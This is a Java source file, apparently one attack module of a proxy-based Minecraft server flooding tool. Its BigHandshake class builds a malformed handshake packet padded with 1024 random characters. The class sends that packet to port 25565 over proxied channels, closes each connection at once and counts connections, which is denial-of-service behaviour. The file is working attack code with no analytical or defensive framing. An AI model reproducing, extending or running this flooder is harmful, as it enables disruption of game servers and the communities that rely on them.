package IO.SYVERIS.methods;

import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;

public class BigHandshake implements Method {
   private SecureRandom r = new SecureRandom();
   private String lol = "";
   private int a = 1024;

   public BigHandshake() {
      for(int i = 1; i < this.a + 1; ++i) {
         this.lol = this.lol + String.valueOf((char)(this.r.nextInt(125) + 1));
      }

   }

   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         out.writeByte(1037);
         out.writeByte(0);
         out.writeBytes(this.lol);
         out.writeByte(9);
         out.writeBytes("localhost");
         out.writeShort(25565);
         out.writeByte(1);
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
